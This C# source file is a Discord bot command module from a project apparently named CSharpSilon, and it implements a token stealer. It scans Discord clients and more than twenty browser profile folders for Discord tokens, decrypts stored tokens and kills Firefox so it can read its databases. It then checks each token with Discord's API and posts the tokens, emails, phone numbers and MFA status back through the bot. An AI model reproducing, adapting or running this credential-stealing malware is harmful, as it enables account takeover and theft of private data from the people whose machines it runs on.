using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Discord.Commands;
using System.Threading.Tasks;
using Discord;
using Newtonsoft.Json;

namespace CSharpSilon.cmds
{
    public class Grabber : ModuleBase<SocketCommandContext>
    {
        public static bool KillFirefox = false;

        [Command("grab"), Alias("steal", "grabber", "discord"), Summary("Grabs All Discord Tokens That It Can Find.")]
        public async Task Grab(bool killFirefox = true)
        {
            KillFirefox = killFirefox;
            var orig = await ReplyAsync("Grab Starting...");
            var tokens = await GetTokens();
            var str = "";
            foreach (var token in tokens)
            {
                str += $"__Account__\n{token}\n\n";
            }

            var embed = new EmbedBuilder()
            {
                Title = "CSharpSilon Grab Success",
                Description = str,
                Color = Color.Magenta,
                Author = new EmbedAuthorBuilder()
                {
                    Name = "CSharpSilon",
                    Url = "https://github.com/KanatiMC/CSharpSilion",

                }

            }.Build();
            await orig.ModifyAsync(msg =>
            {
                msg.Content = "";
                msg.Embed = embed;
            });

        }

        private static readonly HttpClient httpClient = new HttpClient();
        private static readonly string ROAMING = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private static readonly string LOCALAPPDATA =
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private static readonly string REGEX = @"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}";
        private static readonly string REGEX_ENC = @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\""]*";

        public static async Task<List<string>> GetTokens()
        {
            var tokens = new HashSet<string>();
            var tasks = new List<Task>();

            var paths = new Dictionary<string, string>
            {
                // Discord
                { "Discord", Path.Combine(ROAMING, "discord") },
                { "Discord Canary", Path.Combine(ROAMING, "discordcanary") },
                { "Lightcord", Path.Combine(ROAMING, "Lightcord") },
                { "Discord PTB", Path.Combine(ROAMING, "discordptb") },

                // Browsers
                { "Chrome", Path.Combine(LOCALAPPDATA, "Google", "Chrome", "User Data") },
                { "Chrome SxS", Path.Combine(LOCALAPPDATA, "Google", "Chrome SxS", "User Data") },
                { "Opera", Path.Combine(ROAMING, "Opera Software", "Opera Stable") },
                { "Opera GX", Path.Combine(ROAMING, "Opera Software", "Opera GX Stable") },
                { "Brave", Path.Combine(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data") },
                { "Iridium", Path.Combine(LOCALAPPDATA, "Iridium", "User Data") },
                { "Vivaldi", Path.Combine(LOCALAPPDATA, "Vivaldi", "User Data") },
                { "Yandex", Path.Combine(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data") },
                { "Microsoft Edge", Path.Combine(LOCALAPPDATA, "Microsoft", "Edge", "User Data") },

                // Other Browsers
                { "Amigo", Path.Combine(LOCALAPPDATA, "Amigo", "User Data") },
                { "Torch", Path.Combine(LOCALAPPDATA, "Torch", "User Data") },
                { "Kometa", Path.Combine(LOCALAPPDATA, "Kometa", "User Data") },
                { "Orbitum", Path.Combine(LOCALAPPDATA, "Orbitum", "User Data") },
                { "CentBrowse", Path.Combine(LOCALAPPDATA, "CentBrowser", "User Data") },
                { "7Sta", Path.Combine(LOCALAPPDATA, "7Star", "7Star", "User Data") },
                { "Sputnik", Path.Combine(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data") },

                // Firefox
                { "FireFox", Path.Combine(ROAMING, "Mozilla", "Firefox", "Profiles") },

                // Additional
                { "Epic Privacy Browser", Path.Combine(LOCALAPPDATA, "Epic Privacy Browser", "User Data") },
                { "Uran", Path.Combine(LOCALAPPDATA, "uCozMedia", "Uran", "User Data") },
                { "SRWare Iron", Path.Combine(LOCALAPPDATA, "SRWare Iron", "User Data") },
                { "QuteBrowser", Path.Combine(LOCALAPPDATA, "QuteBrowser", "User Data") }
            };

            foreach (var kvp in paths)
            {
                var name = kvp.Key;
                var path = kvp.Value;

                if (Directory.Exists(path))
                {
                    if (name == "FireFox")
                    {
                        tasks.Add(Task.Run(() => tokens.UnionWith(FireFoxSteal(path))));
                    }
                    else
                    {
                        tasks.Add(Task.Run(() => tokens.UnionWith(SafeStorageSteal(path))));
                        tasks.Add(Task.Run(() => tokens.UnionWith(SimpleSteal(path))));
                    }
                }
            }

            await Task.WhenAll(tasks);

            tokens = new HashSet<string>(tokens);

            var tokenInfos = new List<string>();

            foreach (var token in tokens)
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me")
                {
                    Headers =
                    {
                        { "Authorization", token.Trim() }
                    }
                };

                var response = await httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var responseData = await response.Content.ReadAsStringAsync();
                    var user = JsonConvert.DeserializeObject<Dictionary<string, object>>(responseData);

                    var userName = user.TryGetValue("username", out var username)
                        ? $"{username}#{(user.TryGetValue("discriminator", out var discriminator) ? discriminator.ToString() : "0000")}"
                        : "(Unknown)";

                    var userId = user.TryGetValue("id", out var idObj) ? idObj.ToString() : "(Unknown)";
                    var email = user.TryGetValue("email", out var emailObj) &&
                                !string.IsNullOrEmpty(emailObj.ToString())
                        ? emailObj.ToString().Trim()
                        : "(No Email)";
                    var phone = user.TryGetValue("phone", out var phoneObj) && phoneObj != null &&
                                !string.IsNullOrEmpty(phoneObj.ToString())
                        ? phoneObj.ToString()
                        : "(No Phone Number)";
                    var verified = user.TryGetValue("verified", out var verifiedObj)
                        ? verifiedObj.ToString()
                        : "(Unknown)";
                    var mfa = user.TryGetValue("mfa_enabled", out var mfaObj) ? mfaObj.ToString() : "(Unknown)";
                    var nitroType = Convert.ToInt32(user.TryGetValue("premium_type", out var nitroTypeObj)
                        ? nitroTypeObj
                        : 0);

                    var nitroInfos = new Dictionary<int, string>
                    {
                        { 0, "No Nitro" },
                        { 1, "Nitro Classic" },
                        { 2, "Nitro" },
                        { 3, "Nitro Basic" }
                    };

                    var nitroData = nitroInfos.TryGetValue(nitroType, out var value) ? value : "(Unknown)";

                    var tokenInfo = $"{userName} | {userId}\n" +
                                    $"Email: `{email}`\n" +
                                    $"Phone Number: `{phone}`\n" +
                                    $"Verified: `{verified}`\n" +
                                    $"MFA: `{mfa}`\n" +
                                    $"Nitro: `{nitroData}`\n" +
                                    $"Token: `{token}`\n";

                    tokenInfos.Add(tokenInfo);
                }
            }

            return tokenInfos;
        }




        public static List<string> SafeStorageSteal(string path)
        {
            var tokens = new List<string>();
            var encryptedTokens = new List<byte[]>();
            var localStatePath = Path.Combine(path, "Local State");
            byte[] key = null;

            if (File.Exists(localStatePath))
            {
                var jsonContent =
                    JsonConvert.DeserializeObject<Dictionary<string, object>>(File.ReadAllText(localStatePath));
                if (jsonContent?.TryGetValue("os_crypt", out var osCryptObj) == true &&
                    osCryptObj is Dictionary<string, object> osCrypt &&
                    osCrypt.TryGetValue("encrypted_key", out var encryptedKeyObj))
                {
                    key = Convert.FromBase64String(encryptedKeyObj.ToString()).Skip(5).ToArray();
                }

                foreach (var file in Directory.EnumerateFiles(path, "*.ldb", SearchOption.AllDirectories))
                {
                    foreach (var line in File.ReadLines(file))
                    {
                        if (string.IsNullOrWhiteSpace(line)) continue;

                        foreach (Match match in Regex.Matches(line, REGEX_ENC))
                        {
                            var value = match.Value.TrimEnd('\\');
                            var base64String = value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1];
                            encryptedTokens.Add(Convert.FromBase64String(base64String));
                        }
                    }
                }

                foreach (var encryptedToken in encryptedTokens)
                {
                    try
                    {
                        var token = DecryptToken(key, encryptedToken);
                        if (!string.IsNullOrEmpty(token))
                        {
                            tokens.Add(token);
                        }
                    }
                    catch { }
                }
            }

            return tokens;
        }




        private static List<string> SimpleSteal(string path)
        {
            var tokens = new List<string>();

            foreach (var levelDbPath in Directory.EnumerateDirectories(path, "leveldb", SearchOption.AllDirectories))
            {
                foreach (var file in Directory.EnumerateFiles(levelDbPath, "*.ldb"))
                {
                    var fileContent = File.ReadAllText(file);
                    var matches = Regex.Matches(fileContent, REGEX);

                    foreach (Match match in matches)
                    {
                        var token = match.Value;
                        if (!tokens.Contains(token))
                        {
                            tokens.Add(token);
                        }
                    }
                }
            }

            return tokens;
        }


        public static List<string> FireFoxSteal(string path)
        {
            var tokens = new List<string>();

            if (KillFirefox)
            {
                KillFirefoxProcess();
            }

            foreach (var rootDir in Directory.EnumerateDirectories(path))
            {
                foreach (var file in Directory.EnumerateFiles(rootDir, "*.sqlite", SearchOption.AllDirectories))
                {
                    try
                    {
                        // Check if the file exists before attempting to read
                        if (File.Exists(file))
                        {
                            // Process the file as needed
                            using (var reader = new StreamReader(file))
                            {
                                // Add your token extraction logic here
                                var fileContent = reader.ReadToEnd();
                                // Process the content to extract tokens
                                var matches = Regex.Matches(fileContent, REGEX);
                                foreach (Match match in matches)
                                {
                                    var token = match.Value;
                                    if (!tokens.Contains(token))
                                    {
                                        tokens.Add(token);
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }
            }

            return tokens;
        }

        private static void KillFirefoxProcess()
        {
            var firefoxProcesses = Process.GetProcessesByName("firefox");

            foreach (var process in firefoxProcesses)
            {
                try
                {
                    process.Kill();
                    process.WaitForExit();
                }
                catch { }
            }
        }


        public static string DecryptToken(byte[] key, byte[] encryptedToken)
        {
            if (encryptedToken.Length < 16)
                throw new ArgumentException("Encrypted token is too short.", nameof(encryptedToken));

            var iv = encryptedToken.Take(16).ToArray();
            var ciphertext = encryptedToken.Skip(16).ToArray();

            using (var aes = new AesManaged { Key = key, IV = iv, Mode = CipherMode.CBC, Padding = PaddingMode.PKCS7 })
            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(ciphertext))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var sr = new StreamReader(cs, Encoding.UTF8))
            {
                return sr.ReadToEnd();
            }
        }
    }
}